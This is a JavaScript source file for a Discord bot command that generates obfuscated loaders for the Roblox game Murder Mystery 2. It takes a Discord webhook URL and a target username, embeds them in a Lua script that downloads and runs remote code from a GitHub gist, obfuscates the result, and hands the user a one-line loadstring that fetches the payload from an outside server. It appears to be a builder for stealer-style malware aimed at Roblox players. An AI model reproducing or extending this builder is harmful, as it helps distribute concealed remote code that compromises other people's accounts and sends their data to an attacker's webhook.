import { saveScript } from '../services/supabase.js';
import { obfuscate } from '../services/methylone.js';
import { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } from 'discord.js';

export const data = {
  name: 'generate',
  description: 'Generate an obfuscated MM2 beacon loader',
};

export async function execute(interaction) {
  // Create modal
  const modal = new ModalBuilder()
    .setCustomId('generateModal')
    .setTitle('MM2 Beacon Generator');

  // Webhook input
  const webhookInput = new TextInputBuilder()
    .setCustomId('webhook')
    .setLabel('Discord Webhook URL')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('https://discord.com/api/webhooks/...')
    .setRequired(true);

  // Target input
  const targetInput = new TextInputBuilder()
    .setCustomId('target')
    .setLabel('Target Roblox Username')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('roblox_username')
    .setRequired(true);

  // Ping role input
  const roleInput = new TextInputBuilder()
    .setCustomId('pingRole')
    .setLabel('Ping Role ID (optional)')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('123456789012345678')
    .setRequired(false);

  // Add inputs to rows
  const row1 = new ActionRowBuilder().addComponents(webhookInput);
  const row2 = new ActionRowBuilder().addComponents(targetInput);
  const row3 = new ActionRowBuilder().addComponents(roleInput);

  modal.addComponents(row1, row2, row3);

  // Show modal
  await interaction.showModal(modal);

  // Wait for submission
  const submitted = await interaction.awaitModalSubmit({
    time: 120000,
    filter: (i) => i.customId === 'generateModal' && i.user.id === interaction.user.id,
  });

  // Get values
  const webhook = submitted.fields.getTextInputValue('webhook');
  const target = submitted.fields.getTextInputValue('target');
  const pingRole = submitted.fields.getTextInputValue('pingRole') || '';

  // Build base script
  const baseScript = `
_G.YOUR_WEBHOOK = '${webhook}'
_G.TARGET_USER = '${target}'
_G.PING_ROLE_ID = '${pingRole}'
loadstring(game:HttpGet('https://gist.githubusercontent.com/malik020859-ui/8cac02e02ce7d86743822761c71e741b/raw/df692088f170df8d44230d5133779638a0080932/MM2ANTIWARE', true))()
`;

  await submitted.reply('⏳ Obfuscating...');

  let obfuscated;
  try {
    obfuscated = await obfuscate(baseScript);
  } catch (err) {
    return submitted.editReply(`❌ Obfuscation failed: ${err.message}`);
  }

  const id = await saveScript(obfuscated);
  const loadstring = `loadstring(game:HttpGet("https://antiwares.up.railway.app/api/public/s/${id}"))()`;

  // Send to user's DMs
  await interaction.user.send(`✅ **Loader generated!**\n\`\`\`lua\n${loadstring}\n\`\`\``);

  // Confirm in channel
  await submitted.editReply('✅ Loader generated and sent to your DMs!');
}